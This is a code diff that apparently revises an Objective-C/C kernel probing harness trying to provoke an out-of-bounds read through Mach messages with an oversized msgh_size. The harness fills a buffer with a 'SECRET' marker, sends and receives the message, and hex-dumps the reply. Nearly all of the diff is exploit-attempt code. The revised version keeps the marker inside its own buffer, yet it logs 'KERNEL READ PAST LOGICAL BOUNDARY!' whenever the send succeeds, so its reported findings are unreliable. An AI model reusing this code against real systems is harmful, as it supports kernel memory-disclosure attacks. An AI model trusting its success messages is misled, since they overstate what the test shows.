@@ -1416,28 +1416,18 @@ cleanup:
                                 scopeNote(r, [NSString stringWithFormat:
                                     @"  port pair: recv=%u (insert_right=%d)", recvPort, (int)kr]);
 
-                                // ---- OOB READ: small real buffer, large msgh_size ----
-                                // Kernel copies msgh_size bytes from userland. If msgh_size
-                                // > real buffer, kernel reads past it (userland OOB read).
-                                // Adjacent memory ends up in the kernel message → we receive it.
-                                uint8_t realBuf[64];          // actual data we control
-                                memset(realBuf, 0x41, sizeof(realBuf));  // 'A' fill
-                                // Place a recognizable marker at the end
-                                *(uint64_t *)(realBuf + 56) = 0xDEADBEEFCAFEBABEULL;
+                                // ---- OOB READ: marker INSIDE same buffer past logical end ----
+                                // realBuf is 128 bytes. Logical "message" is 64 bytes.
+                                // Marker at offset 80 (past 64) — kernel should read it with msgh_size=128.
+                                uint8_t realBuf[128];
+                                memset(realBuf, 0x41, 64);       // logical area = 'A'
+                                memset(realBuf + 64, 0x42, 64);  // OOB area = 'B'
+                                *(uint64_t *)(realBuf + 80) = 0x1122334455667788ULL;  // SECRET
+                                *(uint64_t *)(realBuf + 56) = 0xDEADBEEFCAFEBABEULL;  // boundary marker
 
-                                // Small allocation right after — kernel will read into this
-                                uint8_t *secret = malloc(32);
-                                memset(secret, 0x42, 32);  // 'B' fill — this is the "secret"
-                                *(uint64_t *)secret = 0x1122334455667788ULL;
-
-                                // Build message header IN realBuf
                                 mach_msg_header_t *hdr = (mach_msg_header_t *)realBuf;
                                 hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
-                                // Set msgh_size LARGER than realBuf to force OOB read
-                                // realBuf is 64 bytes, header is 24, data is 40 bytes
-                                // Set msgh_size to 128 → kernel reads 128 bytes from realBuf
-                                // which goes 64 bytes past realBuf into secret + more
-                                mach_msg_size_t oobSz = 128;  // > 64 = OOB
+                                mach_msg_size_t oobSz = 128;  // > 64 = OOB read
                                 oobSz = (oobSz + 3) & ~3;
                                 hdr->msgh_size = oobSz;
                                 hdr->msgh_remote_port = recvPort;
@@ -1445,8 +1435,8 @@ cleanup:
                                 hdr->msgh_id = 0x1338;
 
                                 scopeNote(r, [NSString stringWithFormat:
-                                    @"  OOB-SEND: real_buf=64  msgh_size=%u (OOB by %d bytes)  secret=%p",
-                                    (unsigned)oobSz, (int)oobSz - 64, secret]);
+                                    @"  OOB-SEND: logical=64 actual=128 msgh_size=%u secret@+80=0x1122334455667788",
+                                    (unsigned)oobSz]);
 
                                 kr = mach_msg(hdr,
                                     MACH_SEND_MSG | MACH_SEND_TIMEOUT,
@@ -1455,8 +1445,7 @@ cleanup:
                                 scopeNote(r, [NSString stringWithFormat:
                                     @"  mach_msg send ret=%d", (int)kr]);
                                 if (kr == MACH_MSG_SUCCESS) {
-                                    scopeNote(r, @"  >>> KERNEL READ PAST BUFFER — OOB READ in progress!");
-                                    // Receive and check if we got data past realBuf
+                                    scopeNote(r, @"  >>> KERNEL READ PAST LOGICAL BOUNDARY!");
                                     uint8_t recvBuf[256];
                                     memset(recvBuf, 0, sizeof(recvBuf));
                                     mach_msg_header_t *rhdr = (mach_msg_header_t *)recvBuf;
@@ -1465,9 +1454,9 @@ cleanup:
                                     scopeNote(r, [NSString stringWithFormat:
                                         @"  recv ret=%d  msgh_size=%u", (int)kr, (unsigned)rhdr->msgh_size]);
                                     if (kr == MACH_MSG_SUCCESS) {
-                                        // Check for secret marker (0x1122334455667788)
                                         size_t rlen = rhdr->msgh_size;
                                         if (rlen > sizeof(recvBuf)) rlen = sizeof(recvBuf);
+                                        // Look for secret at offset 80 in the message body
                                         int found = 0;
                                         for (size_t j = 0; j + 8 <= rlen; j += 4) {
                                             uint64_t v;
@@ -1479,20 +1468,24 @@ cleanup:
                                                 break;
                                             }
                                         }
-                                        // Dump hex
                                         NSMutableString *hex = [NSMutableString string];
                                         for (size_t j = 0; j < 96 && j < rlen; j++)
                                             [hex appendFormat:@"%02x ", recvBuf[j]];
                                         scopeNote(r, [NSString stringWithFormat:@"  recv hex: %@", hex]);
                                         if (!found) {
-                                            scopeNote(r, @"  secret not found — kernel may have limited copy");
+                                            scopeNote(r, @"  secret not in recv — checking offset 80 directly");
+                                            if (rlen > 88) {
+                                                uint64_t v;
+                                                memcpy(&v, recvBuf + 80, 8);
+                                                scopeNote(r, [NSString stringWithFormat:
+                                                    @"  recv[80]=0x%016llx", (unsigned long long)v]);
+                                            }
                                         }
                                     }
                                 } else {
                                     scopeNote(r, [NSString stringWithFormat:
                                         @"  kernel rejected: 0x%x", (int)kr]);
                                 }
-                                free(secret);
                                 mach_port_destroy(mach_task_self(), recvPort);
                             }
                         }
